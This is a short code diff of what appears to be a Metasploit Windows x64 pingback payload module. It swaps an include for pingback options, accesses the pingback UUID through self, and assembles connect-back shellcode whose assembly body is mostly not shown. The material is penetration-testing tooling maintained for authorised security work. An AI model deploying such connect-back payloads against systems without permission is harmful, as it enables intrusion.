@@ -6,7 +6,6 @@
 require 'msf/core/payload/pingback'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/pingback'
-require 'msf/base/sessions/pingback_options'
 
 module MetasploitModule
 
@@ -15,7 +14,7 @@ module MetasploitModule
   include Msf::Payload::Windows
   include Msf::Payload::Single
   include Msf::Payload::Pingback
-  include Msf::Sessions::PingbackOptions
+  include Msf::Payload::Pingback::Options
 
   def initialize(info = {})
     super(merge_info(info,
@@ -39,8 +38,9 @@ module MetasploitModule
       pingback_sleep = datastore['PingbackSleep']
 
       encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
-      pingback_uuid ||= generate_pingback_uuid
-      uuid_as_db = "0x" + pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
+
+      self.pingback_uuid ||= self.generate_pingback_uuid
+      uuid_as_db = "0x" + self.pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
 
       asm = %Q^
         cld                     ; Clear the direction flag.
@@ -255,6 +255,7 @@ module MetasploitModule
 
       ^
       asm
+
     Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
 
   end
